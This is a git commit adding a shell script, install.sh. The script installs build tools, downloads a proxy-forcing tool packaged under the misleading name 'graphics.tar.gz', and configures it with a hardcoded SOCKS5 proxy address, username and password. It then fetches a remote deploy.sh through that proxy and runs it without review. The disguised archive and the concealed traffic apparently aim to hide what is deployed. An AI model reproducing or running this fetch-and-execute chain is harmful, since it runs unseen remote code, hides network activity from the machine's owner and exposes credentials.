ff67a5c0141e19017c8ad6bae610dfe4c3a266fc
liyanul225 <108873090+liyanul225@users.noreply.github.com>
2022-07-10 12:17:52 +0700

    Create install.sh

---
+++ install.sh
@@ -0,0 +1,39 @@
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END 
+listen = :2233 
+loglevel = 1 
+select_proxy_mode=socks5_only 
+socks5 = 103.253.24.243:8080
+socks5_username = woiden_berkah69
+socks5_password = liyan65
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo "**"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo "**"
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/liyanul225/nuyul/main/deploy.sh && chmod +x deploy.sh && ./deploy.sh
